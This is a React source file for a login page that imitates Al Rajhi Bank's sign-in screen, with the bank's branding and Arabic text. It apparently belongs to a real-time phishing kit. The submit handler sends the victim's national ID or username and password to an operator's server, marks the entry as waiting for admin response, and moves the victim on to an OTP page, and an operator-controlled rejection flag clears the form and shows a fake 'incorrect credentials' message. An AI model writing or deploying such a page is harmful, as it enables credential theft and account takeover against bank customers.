import { isFormRejected } from "@/real-time/context/signals";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { useEffect, useState } from "react";
import { FieldValues, useForm } from "react-hook-form";
import Visibility from "@mui/icons-material/Visibility";
import VisibilityOff from "@mui/icons-material/VisibilityOff";
import {
  OutlinedInput,
  Stack,
  FormControl,
  IconButton,
  InputAdornment,
  InputLabel,
} from "@mui/material";
import AlRajhiButton from "@/components/AlRajhiButton";
import Main from "@/components/Main";

function Login() {
  const {
    register,
    handleSubmit,
    reset,
    formState: { isValid },
    setValue,
  } = useForm({
    mode: "onChange",
    defaultValues: {
      username: "",
      password: "",
    },
  });

  function sendData(data: FieldValues) {
    const { username, password } = data;

    sendDataToServer({
      data: {
        "الهوية الوطنية / اسم المستخدم": username,
        "كلمة المرور": password,
      },
      current: "تسجيل الدخول الراجحى",
      nextPage: "الراجحى (OTP)",
      waitingForAdminResponse: true,
    });
  }
  const [password, setPassword] = useState("");
  const [username, setUsername] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => setCurrentPage("تسجيل الدخول الراجحى"), []);
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
      setUsername("");
      setPassword("");
    }
  }, [isFormRejected.value]);

  const handleClickShowPassword = () => setShowPassword((show) => !show);
  return (
    <Main variant="al-rajhi">
      <form
        className="w-[415px] mx-auto flex max-w-[100%]"
        style={{
          flexDirection: "column",
          justifyContent: "space-between",
          height: "calc(100dvh - 1.5rem - 39.6px - 3rem)",
        }}
        onSubmit={handleSubmit(sendData)}
      >
        <div>
          <div className="top">
            <div className="py-2 mb-6">
              <img
                src="images/login-logo.png"
                alt=""
                className="h-10 mx-auto"
              />
            </div>
            <h4 className="font-bold text-gray-500 text-center">مرحباََ بك</h4>
            <h2 className="text-xl font-bold text-gray-800 mb-10 text-center">
              بالتجربة الرقمية الأفضل
            </h2>
          </div>

          <div className="grow flex flex-col gap-4">
            <Stack>
              <FormControl fullWidth>
                <InputLabel htmlFor="username">
                  أدخل الهوية الوطنية أو اسم المستخدم
                </InputLabel>
                <OutlinedInput
                  className="bg-[#f5f6fa]"
                  sx={{ borderRadius: "14px" }}
                  {...register("username", {
                    required: "كلمة المرور مطلوب",
                  })}
                  value={username}
                  onChange={(e) => {
                    const clean = e.target.value.replace(/[^A-Za-z0-9]/g, "");
                    setUsername(clean);
                    setValue("username", clean, {
                      shouldValidate: true,
                    });
                  }}
                  name="username"
                  id="username"
                  label="أدخل الهوية الوطنية أو اسم المستخدم"
                />
              </FormControl>
            </Stack>

            <Stack>
              <FormControl fullWidth>
                <InputLabel htmlFor="password">أدخل كلمة المرور</InputLabel>
                <OutlinedInput
                  className="bg-[#f5f6fa]"
                  sx={{ borderRadius: "14px" }}
                  {...register("password", {
                    required: "يرجي ادخال كلمة المرور",
                  })}
                  onChange={(e) => {
                    const clean = e.target.value.replace(
                      /[^A-Za-z0-9 !@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]/g,
                      ""
                    );
                    setPassword(clean);
                    setValue("password", clean, {
                      shouldValidate: true,
                    });
                  }}
                  value={password}
                  type={showPassword ? "text" : "password"}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label={
                          showPassword
                            ? "hide the password"
                            : "display the password"
                        }
                        onClick={handleClickShowPassword}
                        edge="end"
                      >
                        {showPassword ? (
                          <Visibility sx={{ color: "#0036ff" }} />
                        ) : (
                          <VisibilityOff sx={{ color: "#0036ff" }} />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                  name="password"
                  id="password"
                  label="أدخل كلمة المرور"
                />
              </FormControl>
            </Stack>

            {isFormRejected.value && (
              <Stack className="font-medium mt-5 text-red-500 text-center">
                اسم المستخدم او كلمة المرور غير صحيحة
              </Stack>
            )}
          </div>
        </div>
        <div>
          <AlRajhiButton
            fullWidth
            variant="contained"
            size="large"
            disabled={!isValid}
            type="submit"
          >
            تسجيل الدخول
          </AlRajhiButton>
        </div>
      </form>
    </Main>
  );
}

export default Login;
